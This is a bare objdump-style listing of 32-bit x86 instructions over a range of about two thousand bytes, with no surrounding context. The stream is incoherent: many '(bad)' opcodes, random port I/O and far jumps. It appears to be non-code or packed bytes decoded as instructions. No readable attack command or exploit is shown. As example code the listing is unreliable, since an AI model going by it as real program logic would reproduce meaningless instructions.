  4111f6:	out    0x3e,al
  4111f8:	mov    esi,0x495a1feb
  4111fd:	loope  0x41119d
  4111ff:	jp     0x4111cb
  411201:	dec    ebx
  411202:	ficomp WORD PTR [ecx-0x1c]
  411205:	mov    ch,dh
  411207:	in     eax,0x8d
  411209:	sbb    DWORD PTR [edi],ebx
  41120b:	fisubr DWORD PTR [ecx]
  41120d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41120e:	imul   edx,DWORD PTR [ebp-0x52],0x34
  411212:	inc    edi
  411213:	cmp    esi,edx
  411215:	and    dl,BYTE PTR [ebp-0x46b8ce81]
  41121b:	or     BYTE PTR [esi-0x63],cl
  41121e:	push   0x8b54edc5
  411223:	adc    ah,BYTE PTR [edx]
  411225:	loop   0x4111ae
  411227:	dec    edi
  411228:	pop    edi
  411229:	add    esi,DWORD PTR [ecx]
  41122b:	(bad)  
  41122d:	out    0x99,eax
  41122f:	cmp    esi,DWORD PTR [edi+ebp*4+0x4f26689b]
  411236:	pushf  
  411237:	mov    eax,0x2e717cbf
  41123c:	shl    DWORD PTR [esp+edx*1],cl
  41123f:	push   esp
  411240:	dec    ecx
  411241:	outs   dx,DWORD PTR ds:[esi]
  411242:	js     0x411225
  411244:	sub    eax,DWORD PTR [ebp+0x20]
  411247:	pushf  
  411248:	sbb    al,0xbe
  41124a:	out    0x17,eax
  41124c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41124d:	ds mov dl,0x16
  411250:	cmp    eax,0x7bf04fd1
  411255:	repnz lock lds esi,FWORD PTR [esi]
  411259:	and    BYTE PTR [ecx+ebp*4],0xe4
  41125d:	(bad)  [esi-0x2a]
  411260:	push   eax
  411261:	jmp    0xad37:0x98db470e
  411268:	pop    esp
  411269:	push   esi
  41126a:	mov    dl,dh
  41126c:	int    0x27
  41126e:	and    DWORD PTR [edx+0x327e6d16],edi
  411274:	push   edx
  411275:	aas    
  411276:	lods   eax,DWORD PTR ds:[esi]
  411277:	out    dx,eax
  411278:	jno    0x41127a
  41127a:	jmp    0x4557:0xa5313b07
  411281:	sub    ebx,ebx
  411283:	int    0x2c
  411285:	pop    esi
  411286:	scas   al,BYTE PTR es:[edi]
  411287:	mov    edx,0x1b5a45ae
  41128c:	pop    ebx
  41128d:	inc    ebp
  41128e:	mov    ds:0xfb88f4f7,eax
  411293:	(bad)  
  411294:	fadd   st(1),st
  411296:	ds retf 
  411298:	inc    edi
  411299:	and    bl,bl
  41129b:	cmp    esi,eax
  41129d:	ret    0xe4dc
  4112a0:	rcr    edi,cl
  4112a2:	inc    esi
  4112a3:	xchg   esp,eax
  4112a4:	adc    al,bl
  4112a6:	aaa    
  4112a7:	out    dx,al
  4112a8:	pop    edi
  4112a9:	and    ecx,edi
  4112ab:	push   ebp
  4112ac:	clc    
  4112ad:	ss lahf 
  4112af:	ror    BYTE PTR [edi-0x3f],1
  4112b2:	lods   al,BYTE PTR ds:[esi]
  4112b3:	pavgb  mm7,mm7
  4112b6:	or     al,0x43
  4112b8:	add    DWORD PTR [edx-0x42],eax
  4112bb:	into   
  4112bc:	sbb    eax,0x9501c8ce
  4112c1:	leave  
  4112c2:	popf   
  4112c3:	aas    
  4112c4:	outs   dx,BYTE PTR ds:[esi]
  4112c5:	adc    al,cl
  4112c7:	imul   DWORD PTR [edx-0xf]
  4112ca:	shl    DWORD PTR [ecx],1
  4112cc:	lds    esi,FWORD PTR [ebx+0x3a]
  4112cf:	and    eax,edi
  4112d1:	jae    0x4112a3
  4112d3:	repz mov cl,0xfc
  4112d6:	and    al,0xee
  4112d8:	jbe    0x41126d
  4112da:	popf   
  4112db:	xor    eax,0x5caddad2
  4112e0:	ja     0x41133d
  4112e2:	cld    
  4112e3:	aam    0x24
  4112e5:	xchg   edi,eax
  4112e6:	sub    edi,0x2d
  4112e9:	(bad)  
  4112eb:	in     eax,dx
  4112ec:	jge    0x41136b
  4112ee:	dec    eax
  4112ef:	ja     0x4112da
  4112f1:	mov    esi,0xa1f119cc
  4112f6:	push   esi
  4112f7:	mov    esi,0xd157a526
  4112fc:	cmp    eax,ecx
  4112fe:	push   ebp
  4112ff:	inc    esi
  411300:	mov    eax,0x851a92ac
  411305:	aaa    
  411306:	sbb    DWORD PTR [eax-0x1c002c46],eax
  41130c:	hlt    
  41130d:	icebp  
  41130e:	out    dx,al
  41130f:	pop    edi
  411310:	push   es
  411311:	jecxz  0x4112e1
  411313:	aam    0xc3
  411315:	ss loope 0x4112ee
  411318:	test   al,bl
  41131a:	sbb    eax,0x6ac5849d
  41131f:	xor    eax,0x4419f72
  411324:	inc    edi
  411325:	and    edi,DWORD PTR [edi+0x776b0ca2]
  41132b:	mov    ebp,0x4a668932
  411330:	lds    eax,FWORD PTR [eax]
  411332:	jp     0x411322
  411334:	adc    eax,0x92562568
  411339:	sub    ah,BYTE PTR [eax+0xd751bcc]
  41133f:	jo     0x4112f5
  411341:	inc    edi
  411342:	push   edi
  411343:	lods   al,BYTE PTR ds:[esi]
  411344:	(bad)  
  411345:	cmp    DWORD PTR [eax+0x77],esp
  411348:	inc    edx
  411349:	xor    eax,0x96646c21
  41134e:	fadd   DWORD PTR [eax]
  411350:	ret    0x21cc
  411353:	loope  0x411307
  411355:	outs   dx,DWORD PTR ds:[esi]
  411356:	enter  0x6114,0xa0
  41135a:	pushf  
  41135b:	popf   
  41135c:	rcl    DWORD PTR [eax],0x8
  41135f:	popf   
  411360:	add    ebx,0xa80b59b7
  411366:	jb     0x41132d
  411368:	jns    0x411305
  41136a:	mov    ebp,0x47bb7975
  41136f:	pop    edx
  411370:	ror    DWORD PTR [eax+ebx*8-0x21],cl
  411374:	popf   
  411375:	call   0x78838c93
  41137a:	scas   al,BYTE PTR es:[edi]
  41137b:	int    0x7c
  41137d:	xor    DWORD PTR ds:0x82f221b3,edi
  411383:	dec    edx
  411384:	aaa    
  411385:	(bad)  
  411386:	adc    al,0x82
  411388:	xchg   esp,eax
  411389:	(bad)  
  41138a:	fwait
  41138b:	push   0xffffffea
  41138d:	mov    al,BYTE PTR [eax+0x3f40aac6]
  411393:	jno    0x411319
  411395:	test   DWORD PTR [ebx-0x25],esi
  411398:	push   ebx
  411399:	pop    ds
  41139a:	jle    0x411331
  41139c:	stos   BYTE PTR es:[edi],al
  41139d:	out    0x3b,al
  41139f:	je     0x411417
  4113a1:	in     eax,0xa8
  4113a3:	ins    DWORD PTR es:[edi],dx
  4113a4:	sbb    ch,cl
  4113a6:	jmp    0x359f8160
  4113ab:	das    
  4113ac:	test   BYTE PTR [esi],cl
  4113ae:	mov    bl,0x2c
  4113b0:	outs   dx,DWORD PTR ds:[esi]
  4113b1:	jl     0x4113f3
  4113b3:	push   ecx
  4113b4:	int3   
  4113b5:	pop    ecx
  4113b6:	or     BYTE PTR [ebp+0x5b],dh
  4113b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ba:	je     0x41142a
  4113bc:	ficom  DWORD PTR [edi+eiz*4-0x4033b57c]
  4113c3:	jo     0x411389
  4113c5:	xchg   ah,ah
  4113c7:	or     eax,DWORD PTR [edi-0x10]
  4113ca:	rol    DWORD PTR [edi-0x48],0x88
  4113ce:	mov    edi,0xdac18515
  4113d3:	pop    esp
  4113d4:	lea    ebp,[edx-0x4f]
  4113d7:	out    dx,al
  4113d8:	mov    edi,0xec10c7f3
  4113dd:	test   eax,0x55ce84c1
  4113e2:	mov    ah,0x1b
  4113e4:	mov    edx,DWORD PTR [ecx+ecx*2-0x7]
  4113e8:	sbb    BYTE PTR [edi],ch
  4113ea:	dec    edx
  4113eb:	inc    ebx
  4113ec:	js     0x4113dc
  4113ee:	scas   al,BYTE PTR es:[edi]
  4113ef:	sbb    esi,esi
  4113f1:	inc    esp
  4113f2:	push   edi
  4113f3:	and    BYTE PTR [ecx],ah
  4113f5:	add    eax,0x435743d8
  4113fa:	sub    eax,0xbd5f8e59
  4113ff:	add    al,0xeb
  411401:	aaa    
  411402:	cmp    al,0x87
  411404:	xchg   ebx,eax
  411405:	sbb    eax,0x7db331f
  41140a:	gs shl ecx,cl
  41140d:	add    bh,al
  41140f:	sti    
  411410:	xor    al,0xe6
  411412:	cmp    DWORD PTR [edx+0x49],eax
  411415:	mov    esi,0x31173acf
  41141a:	les    ebx,FWORD PTR [ebx-0x48]
  41141d:	pop    edi
  41141e:	and    eax,0x767e0e61
  411423:	mov    eax,ds:0xd1b82d61
  411428:	ficomp WORD PTR [ebx+0x7990a493]
  41142e:	mov    eax,0x6f82bc86
  411433:	vandnpd xmm0,xmm0,XMMWORD PTR [edi]
  411437:	mov    edx,0x46a0acb8
  41143c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41143d:	lahf   
  41143e:	jns    0x4114a7
  411440:	popa   
  411441:	sbb    BYTE PTR [edx],0x5f
  411444:	mov    esi,DWORD PTR [ecx-0x13]
  411447:	mov    bl,0xba
  411449:	mov    edi,0xec25a634
  41144e:	lods   al,BYTE PTR ds:[esi]
  41144f:	outs   dx,BYTE PTR ds:[esi]
  411450:	fisubr WORD PTR [edi-0xc]
  411453:	mov    cl,0x62
  411455:	mov    ebx,0xab716527
  41145a:	pop    ecx
  41145b:	icebp  
  41145c:	ds dec edi
  41145f:	cld    
  411460:	jno    0x411466
  411462:	dec    cl
  411464:	pop    ebp
  411465:	lds    ecx,FWORD PTR [ebp-0x23]
  411468:	jl     0x4114ca
  41146a:	mov    ecx,0x7791d129
  41146f:	arpl   WORD PTR [edi+0x6],di
  411472:	ficom  DWORD PTR [ebp+0x7c]
  411475:	add    DWORD PTR [esi+0x14e4a204],ecx
  41147b:	inc    esi
  41147c:	pop    edi
  41147d:	data16 jne 0x41148b
  411480:	hlt    
  411481:	pusha  
  411482:	mov    gs,esp
  411484:	std    
  411485:	dec    esi
  411486:	dec    esp
  411487:	adc    BYTE PTR [esi-0x5d8971f0],al
  41148d:	or     dl,ch
  41148f:	pop    ss
  411490:	pop    esi
  411491:	aaa    
  411492:	retf   
  411493:	sub    DWORD PTR [edx+0x36e731f4],0x176c265d
  41149d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41149e:	or     dl,bh
  4114a0:	popa   
  4114a1:	xchg   ebp,eax
  4114a2:	daa    
  4114a3:	pusha  
  4114a4:	cmp    ch,bl
  4114a6:	imul   edx,DWORD PTR [esp+ebp*4],0xa4c7980b
  4114ad:	dec    edx
  4114ae:	xchg   BYTE PTR [esi+0x2370b6ed],bl
  4114b4:	dec    ecx
  4114b5:	ror    esi,cl
  4114b7:	sub    al,0x30
  4114b9:	pop    edx
  4114ba:	ficom  DWORD PTR [ebp-0x6]
  4114bd:	add    eax,0xcf39bc7d
  4114c2:	mov    cl,0xbc
  4114c4:	inc    edx
  4114c5:	cmp    esp,edx
  4114c7:	aaa    
  4114c8:	test   al,0xa1
  4114ca:	dec    esi
  4114cb:	data16 in al,0xfc
  4114ce:	(bad)  
  4114cf:	fcom   QWORD PTR [esi]
  4114d1:	(bad)  
  4114d2:	ffree  st(6)
  4114d4:	inc    ebx
  4114d5:	pop    ss
  4114d6:	scas   al,BYTE PTR es:[edi]
  4114d7:	(bad)  
  4114d9:	mov    cl,0x7
  4114db:	dec    edi
  4114dc:	mov    edx,0xe6d98335
  4114e1:	xlat   BYTE PTR ds:[ebx]
  4114e2:	inc    edi
  4114e3:	pop    ebp
  4114e4:	sub    BYTE PTR [ebx-0x54b31805],bh
  4114ea:	jb     0x41147c
  4114ec:	push   edi
  4114ed:	bound  ebx,QWORD PTR [ecx]
  4114ef:	inc    edi
  4114f0:	mov    al,0x14
  4114f2:	cmc    
  4114f3:	mov    eax,gs:0xfdc81c39
  4114f9:	js     0x411543
  4114fb:	test   al,0x19
  4114fd:	and    DWORD PTR [ebx+0x7b36d7b6],edi
  411503:	cmc    
  411504:	cmp    DWORD PTR [ebp+0x33],ebp
  411507:	mul    bh
  411509:	mov    dh,0xfe
  41150b:	or     eax,DWORD PTR [edx-0x61]
  41150e:	ins    BYTE PTR es:[edi],dx
  41150f:	push   edx
  411510:	sub    ah,dl
  411512:	fwait
  411513:	jge    0x41157e
  411515:	sbb    edi,ecx
  411517:	test   al,0x6c
  411519:	mov    BYTE PTR [ebp+0x7860b6f8],dh
  41151f:	out    0xbf,al
  411521:	jb     0x4114c4
  411523:	push   ss
  411524:	jnp    0x4114e0
  411526:	xor    ah,BYTE PTR [edx+0x769d000f]
  41152c:	sbb    esi,ebx
  41152e:	mov    ?,WORD PTR [edx+0x5ec30ae8]
  411534:	sub    ecx,DWORD PTR [ebx-0x51a9db72]
  41153a:	mov    dh,BYTE PTR [ebx-0xf5b2733]
  411540:	mov    esi,0xa8a8b1df
  411545:	jmp    0x41150d
  411547:	sub    ecx,edx
  411549:	bound  edx,QWORD PTR [ebx+eax*1+0x17b92690]
  411550:	mov    ds:0x1ea9b94a,al
  411555:	cmp    DWORD PTR [edx+0x3578078c],ecx
  41155b:	fcom   QWORD PTR [ebx-0x1f]
  41155e:	jne    0x4115cb
  411560:	stos   DWORD PTR es:[edi],eax
  411561:	pushf  
  411562:	cmp    eax,esp
  411564:	std    
  411565:	mov    edx,0x662ba897
  41156a:	jns    0x411598
  41156c:	cli    
  41156d:	mov    eax,0x1e8b9813
  411572:	loope  0x41155e
  411574:	or     eax,0x244b3689
  411579:	inc    ecx
  41157a:	sub    DWORD PTR [eax+0x68e0608f],ecx
  411580:	xchg   edi,eax
  411581:	xor    DWORD PTR [edi-0x2e],esp
  411584:	xchg   edx,eax
  411585:	mov    DWORD PTR ds:0xbc316e9a,ebx
  41158b:	add    DWORD PTR [edi+ebp*1],0x6b
  41158f:	(bad)  
  411590:	xchg   ecx,eax
  411591:	cmp    al,0x1d
  411593:	cld    
  411594:	push   esp
  411595:	mov    ecx,0xa58f445
  41159a:	fld    st(4)
  41159c:	sbb    al,0xa8
  41159e:	mov    ds:0x714917fe,eax
  4115a3:	loope  0x4115fa
  4115a5:	fadd   QWORD PTR [eax+0x4f1571d6]
  4115ab:	lea    edi,[ebx-0x796b969b]
  4115b1:	js     0x411537
  4115b3:	inc    ecx
  4115b4:	sbb    al,0x3b
  4115b6:	retf   
  4115b7:	aas    
  4115b8:	sub    eax,0x919f33cb
  4115bd:	retf   0x8b6
  4115c0:	ds adc ah,BYTE PTR cs:[esi-0x1f]
  4115c5:	pop    ecx
  4115c6:	lea    ecx,[edx]
  4115c8:	pop    ebx
  4115c9:	test   ebp,esi
  4115cb:	ficomp DWORD PTR [ebp+0x29]
  4115ce:	adc    BYTE PTR [edi],dh
  4115d0:	push   edi
  4115d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d2:	dec    esp
  4115d3:	xor    DWORD PTR [eax],ebp
  4115d5:	fidivr WORD PTR [esi+0x4fa7748c]
  4115db:	cmp    edi,DWORD PTR [esi-0x71]
  4115de:	nop
  4115df:	jo     0x41164a
  4115e1:	pop    esi
  4115e2:	je     0x41164f
  4115e4:	cmc    
  4115e5:	fidiv  DWORD PTR [esi-0x3caab66c]
  4115eb:	int3   
  4115ec:	(bad)  
  4115ee:	repnz push edi
  4115f0:	fstp   QWORD PTR [edx]
  4115f2:	div    DWORD PTR [ebp+0x68d527f1]
  4115f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115f9:	pop    esp
  4115fa:	enter  0xc588,0x1
  4115fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115ff:	pop    edx
  411600:	mov    ebx,0x2a9d495b
  411605:	jmp    0x2fe57608
  41160a:	sbb    DWORD PTR [edx],ecx
  41160c:	sbb    eax,DWORD PTR [ecx+0x5d]
  41160f:	mov    ch,0x9e
  411611:	jge    0x411687
  411613:	lods   al,BYTE PTR ds:[esi]
  411614:	lods   al,BYTE PTR ds:[esi]
  411615:	xchg   bh,bh
  411617:	lahf   
  411618:	ret    
  411619:	sbb    BYTE PTR [esi],dh
  41161b:	repnz out 0xe4,eax
  41161e:	inc    esi
  41161f:	inc    ebp
  411620:	cmp    bl,BYTE PTR [ecx+0x2d]
  411623:	inc    edi
  411624:	mov    bl,0x76
  411626:	outs   dx,DWORD PTR ds:[esi]
  411627:	aas    
  411628:	dec    esi
  411629:	loope  0x411625
  41162b:	mov    ecx,0x70f73a7e
  411630:	outs   dx,BYTE PTR ds:[esi]
  411631:	test   al,0x84
  411633:	push   edi
  411634:	push   esp
  411635:	inc    esp
  411636:	and    ch,BYTE PTR [esi+edi*1]
  411639:	or     al,0xa3
  41163b:	outs   dx,DWORD PTR ds:[esi]
  41163c:	sahf   
  41163d:	imul   edx,DWORD PTR [ebx+0x1ffcdddf],0x49
  411644:	inc    ebx
  411645:	leave  
  411646:	pushf  
  411647:	jmp    0x411635
  411649:	enter  0xbb3f,0x89
  41164d:	and    eax,0x3c31b968
  411652:	dec    ebx
  411653:	fisubr DWORD PTR [edi-0x28a6a1a1]
  411659:	mov    dl,0x4c
  41165b:	enter  0x10e8,0x97
  41165f:	sbb    eax,0x49929eec
  411664:	ds adc eax,0x39eaf735
  41166a:	xchg   edx,eax
  41166b:	push   ecx
  41166c:	dec    esi
  41166d:	ret    0x604a
  411670:	or     al,0xb1
  411672:	fnstcw WORD PTR ds:0xbe7fb1ff
  411678:	outs   dx,BYTE PTR ds:[esi]
  411679:	xlat   BYTE PTR ds:[ebx]
  41167a:	pop    eax
  41167b:	ss or  ch,cl
  41167e:	mov    ch,0xe7
  411680:	mov    ?,ebp
  411682:	xlat   BYTE PTR ds:[ebx]
  411683:	int    0xdb
  411685:	je     0x41161d
  411687:	add    al,0x88
  411689:	fisttp QWORD PTR [eax]
  41168b:	xchg   eax,eax
  41168d:	jb     0x41161c
  41168f:	daa    
  411690:	jne    0x41169b
  411692:	cli    
  411693:	pop    ecx
  411694:	push   0x9d4817a3
  411699:	mov    esp,0xcdde24e5
  41169e:	mov    ebp,?
  4116a0:	and    DWORD PTR [ecx+0x27],0xffffff92
  4116a4:	add    BYTE PTR [esi+0x26],al
  4116a7:	jne    0x41162f
  4116a9:	inc    esp
  4116aa:	xor    edx,DWORD PTR [esi+0x41]
  4116ad:	fnstenv [edi]
  4116af:	inc    ebx
  4116b0:	mov    bh,0x11
  4116b2:	pop    esi
  4116b3:	lods   al,BYTE PTR ds:[esi]
  4116b4:	and    esp,ebx
  4116b6:	in     al,dx
  4116b7:	mov    BYTE PTR [ebp-0x6c],bl
  4116ba:	in     eax,0x79
  4116bc:	retf   0x6f09
  4116bf:	sbb    ch,BYTE PTR ds:0x8ae1462d
  4116c5:	repz icebp 
  4116c7:	lea    eax,[ecx-0x4158e58a]
  4116cd:	popf   
  4116ce:	call   0x8074abd8
  4116d3:	cmp    cl,BYTE PTR [esi+0x6645581f]
  4116d9:	stos   BYTE PTR es:[edi],al
  4116da:	ja     0x411671
  4116dc:	lock mov ch,0x87
  4116df:	pop    ebx
  4116e0:	inc    ecx
  4116e1:	xor    eax,0xa46d3a11
  4116e6:	sub    al,0x7
  4116e8:	int    0x19
  4116ea:	cmc    
  4116eb:	and    eax,0x905d10a6
  4116f0:	retf   
  4116f1:	sub    DWORD PTR [ebx+0x45],edi
  4116f4:	sbb    eax,0x6f030969
  4116f9:	aam    0x31
  4116fb:	and    BYTE PTR [ebx],cl
  4116fd:	add    bl,0x51
  411700:	(bad)  
  411701:	(bad)
  411704:	mov    ch,0x40
  411706:	ds out dx,al
  411708:	cmp    BYTE PTR [esi+edi*4-0x267dba17],ah
  41170f:	xlat   BYTE PTR ds:[ebx]
  411710:	addr16 fs sbb ch,al
  411714:	outs   dx,BYTE PTR gs:[esi]
  411716:	js     0x4116fc
  411718:	int3   
  411719:	aas    
  41171a:	ss shl al,cl
  41171d:	mov    ds:0x41bd0bd9,eax
  411722:	(bad)  
  411723:	sti    
  411724:	jne    0x411739
  411726:	stos   BYTE PTR es:[edi],al
  411727:	fistp  WORD PTR [edi-0x46fdc1b9]
  41172d:	fisttp WORD PTR [ebp+eax*4-0x1a169892]
  411734:	call   0x7f7bfc10
  411739:	and    al,BYTE PTR [edx-0x4e]
  41173c:	js     0x4116fb
  41173e:	add    esi,DWORD PTR ds:0xab917271
  411744:	popa   
  411745:	mov    al,0xc6
  411747:	rol    BYTE PTR [ecx-0x3d2b084d],0xc1
  41174e:	dec    ebx
  41174f:	jp     0x41179a
  411751:	repnz adc DWORD PTR [ebx],ebx
  411754:	les    edi,FWORD PTR [ebx+0x61f8add5]
  41175a:	push   0xb898619c
  41175f:	ficomp DWORD PTR [ebx+ebx*4+0x6db58b8d]
  411766:	add    DWORD PTR [eax],0xffffffb1
  411769:	arpl   WORD PTR ds:0xe3f92112,bx
  41176f:	ss loop 0x411745
  411772:	psubb  mm5,mm6
  411775:	dec    esi
  411776:	push   edx
  411777:	in     eax,dx
  411778:	sti    
  411779:	out    dx,al
  41177a:	jae    0x411770
  41177c:	sub    DWORD PTR gs:[eax],ecx
  41177f:	pop    edi
  411780:	mov    ch,0x10
  411782:	cdq    
  411783:	mov    ah,0xab
  411785:	out    dx,eax
  411786:	mov    ss,WORD PTR [esi-0x4]
  411789:	ror    DWORD PTR [eax-0x4ed66784],0x69
  411790:	inc    ecx
  411791:	popa   
  411792:	xchg   DWORD PTR [ecx],ebp
  411794:	std    
  411795:	in     al,0xc
  411797:	les    ebx,FWORD PTR [ecx+edx*4]
  41179a:	lods   eax,DWORD PTR ds:[esi]
  41179b:	in     al,0xc3
  41179d:	mov    esp,0x11d87ae7
  4117a2:	(bad)  
  4117a3:	aas    
  4117a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a5:	xor    al,0x5f
  4117a7:	cmp    al,0xe7
  4117a9:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117ab:	add    bl,BYTE PTR [edx+0x2]
  4117ae:	xchg   ebx,eax
  4117af:	dec    edx
  4117b0:	sub    cl,0xfc
  4117b3:	shr    BYTE PTR [esi+0x3c],0x1e
  4117b7:	xor    BYTE PTR [ebx-0x7b],bl
  4117ba:	push   esi
  4117bb:	push   bx
  4117bd:	fwait
  4117be:	xor    ah,al
  4117c0:	ins    DWORD PTR es:[edi],dx
  4117c1:	sbb    BYTE PTR [eax],bl
  4117c3:	cs dec ebx
  4117c5:	scas   al,BYTE PTR es:[edi]
  4117c6:	dec    eax
  4117c7:	push   edi
  4117c8:	push   esi
  4117c9:	test   eax,0x7a5cdd7c
  4117ce:	cmp    ebp,DWORD PTR [esi+0x259f4f56]
  4117d4:	cmc    
  4117d5:	cmp    ebx,0x5d60e50a
  4117db:	xchg   edi,eax
  4117dc:	mov    cl,0xab
  4117de:	dec    edi
  4117df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117e0:	into   
  4117e1:	hlt    
  4117e2:	inc    esp
  4117e3:	inc    ebp
  4117e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e5:	iret   
  4117e6:	adc    bl,BYTE PTR [ebp-0x67]
  4117e9:	daa    
  4117ea:	push   edi
  4117eb:	mov    ch,0x5b
  4117ed:	mov    bh,0x58
  4117ef:	ss inc ebx
  4117f1:	pop    ebp
  4117f2:	lock inc ecx
  4117f4:	mov    ebp,DWORD PTR ds:0xba961706
  4117fa:	leave  
  4117fb:	push   eax
  4117fc:	adc    cl,BYTE PTR [esi+eax*1+0x7f]
  411800:	cmp    ebx,DWORD PTR [ebx-0x3]
  411803:	in     al,dx
  411804:	pop    ebx
  411805:	(bad)  
  411807:	pop    ss
  411808:	inc    ecx
  411809:	and    bl,ch
  41180b:	xchg   DWORD PTR [eax],eax
  41180d:	jne    0x4117e2
  41180f:	adc    DWORD PTR [ecx],esi
  411811:	mov    ds:0x4d7d7ebb,eax
  411816:	test   eax,0x6f0fc80d
  41181b:	mov    cl,0x18
  41181d:	jge    0x41188c
  41181f:	push   cs
  411820:	fmul   DWORD PTR [esi+0x71]
  411823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411824:	test   eax,0xf2166ea
  411829:	jmp    0x411882
  41182b:	aaa    
  41182c:	jae    0x411874
  41182e:	pop    ss
  41182f:	shl    bl,cl
  411831:	in     eax,0x9e
  411833:	jle    0x41183a
  411835:	jb     0x4117e6
  411837:	fsub   QWORD PTR [eax]
  411839:	jl     0x411865
  41183b:	push   ds
  41183c:	out    0x17,eax
  41183e:	inc    eax
  41183f:	push   DWORD PTR [ebp+ebx*4+0x2e]
  411843:	mov    al,dl
  411845:	xor    cl,0xa2
  411848:	jecxz  0x41186a
  41184a:	push   esp
  41184b:	(bad)  
  41184c:	push   ebp
  41184d:	jge    0x411846
  41184f:	dec    BYTE PTR [ebx+0x2341a59b]
  411855:	mov    ecx,0xb6e466a
  41185a:	addr16 mov ah,0x26
  41185d:	shl    ch,cl
  41185f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411860:	test   BYTE PTR [eax-0x380c04fb],al
  411866:	cmp    BYTE PTR [edx],bl
  411868:	inc    edi
  411869:	push   eax
  41186a:	or     DWORD PTR [edx-0x68],esi
  41186d:	sub    dl,BYTE PTR [edi-0xf35f0fb]
  411873:	push   ecx
  411874:	scas   al,BYTE PTR es:[edi]
  411875:	jo     0x411877
  411877:	fild   QWORD PTR [ebp-0x549946c2]
  41187d:	jae    0x4118df
  41187f:	ret    0x7264
  411882:	fistp  WORD PTR [ecx+0x25]
  411885:	push   eax
  411886:	rol    DWORD PTR fs:[eax],cl
  411889:	mov    ds:0x3e721973,eax
  41188e:	xor    al,0x21
  411890:	rol    DWORD PTR [edi],cl
  411892:	inc    esp
  411893:	mov    dl,0x2d
  411895:	sub    ebp,DWORD PTR [ebx+ebx*4+0x4d]
  411899:	xor    edi,DWORD PTR [edi-0x56]
  41189c:	in     eax,dx
  41189d:	pop    ecx
  41189e:	(bad)  
  41189f:	adc    bh,dh
  4118a1:	(bad)  
  4118a2:	faddp  st(0),st
  4118a4:	ds repz push 0x21
  4118a8:	sub    esp,DWORD PTR [esi]
  4118aa:	mov    DWORD PTR [ecx+0x4dec640b],ebx
  4118b0:	pushf  
  4118b1:	pop    ebp
  4118b2:	push   edi
  4118b3:	xlat   BYTE PTR ds:[ebx]
  4118b4:	fs popa 
  4118b6:	xor    BYTE PTR [edx-0x41],al
  4118b9:	adc    eax,0x1553e314
  4118be:	stos   BYTE PTR es:[edi],al
  4118bf:	xchg   DWORD PTR [ebp+0x9],esp
  4118c2:	push   esp
  4118c3:	es addr16 push edx
  4118c6:	hlt    
  4118c7:	jo     0x41190c
  4118c9:	outs   dx,DWORD PTR ds:[esi]
  4118ca:	or     BYTE PTR [ebx],0x70
  4118cd:	push   ds
  4118ce:	mov    al,ds:0xd8eaedf3
  4118d3:	popf   
  4118d4:	test   BYTE PTR ds:0xc29d7278,0xcc
  4118db:	jne    0x4118b6
  4118dd:	cmp    al,0xde
  4118df:	add    DWORD PTR [esi-0x3fdb6e20],ebx
  4118e5:	sbb    BYTE PTR [edi+0x1228ed45],0x35
  4118ec:	mov    esi,0xed26840c
  4118f1:	shr    DWORD PTR [ebx+0x18e4f0ae],0x94
  4118f8:	push   ebp
  4118f9:	xchg   ebp,eax
  4118fa:	push   eax
  4118fb:	jnp    0x4118e1
  4118fd:	in     al,dx
  4118fe:	call   0x276a6ba3
  411903:	addr16 hlt 
  411905:	mov    BYTE PTR [edx],0xef
  411908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411909:	dec    eax
  41190a:	test   BYTE PTR ds:0xa22722f4,bh
  411910:	sbb    eax,0x466959bd
  411915:	and    BYTE PTR [edx+0x43],0x92
  411919:	je     0x411971
  41191b:	mov    al,0xe3
  41191d:	jnp    0x41197a
  41191f:	gs call 0x5f74:0x509c8acb
  411927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411928:	jmp    0xe541ef
  41192d:	sbb    cl,dh
  41192f:	lahf   
  411930:	ss xor eax,0xc28c5050
  411936:	jg     0x411921
  411938:	test   al,0x16
  41193a:	or     al,0xf5
  41193c:	add    dh,BYTE PTR [ebx+0x55]
  41193f:	dec    esp
  411940:	add    al,0x74
  411942:	stos   BYTE PTR es:[edi],al
  411943:	fidivr DWORD PTR [edi+0x6008f261]
  411949:	jmp    0xa96c:0xadad7e23
  411950:	mov    ebx,0x5dfa6ab2
  411955:	rcr    ebx,1
  411957:	rol    DWORD PTR [edi],1
  411959:	fild   WORD PTR [ebx-0x3614b00c]
  41195f:	adc    BYTE PTR [ebx-0x15],ah
  411962:	ror    dh,1
  411964:	pop    edi
  411965:	arpl   ax,bx
  411967:	dec    edx
  411968:	cdq    
  411969:	add    ebx,ebp
  41196b:	je     0x4119a8
  41196d:	aas    
  41196e:	sub    al,BYTE PTR [edi+eiz*8]
  411971:	fisubr WORD PTR [eax+edi*8]
  411974:	ins    BYTE PTR es:[edi],dx
  411975:	xchg   esp,eax
  411976:	das    
  411977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411978:	fdiv   DWORD PTR [ebx+0x56bd206d]
  41197e:	repz jge 0x41192f
  411981:	test   eax,0xf3f7f9c0
  411986:	inc    ecx
  411987:	je     0x4119ec
  411989:	imul   edx,DWORD PTR [esi-0x5f1efd4f],0xffffff91
  411990:	mov    al,0x5a
  411992:	push   ecx
  411993:	and    DWORD PTR [edi-0x4de12310],eax
  411999:	add    DWORD PTR [eax],eax
  41199b:	or     BYTE PTR [ebx],0x96
  41199e:	xor    BYTE PTR [eax+0x57],0x78
  4119a2:	cs jecxz 0x411993
  4119a5:	in     al,dx
  4119a6:	sbb    DWORD PTR [ebx],0x5037cc50
  4119ac:	jne    0x4119ef
  4119ae:	retf   
  4119af:	mov    dh,0x14
  4119b1:	jb     0x411a1c
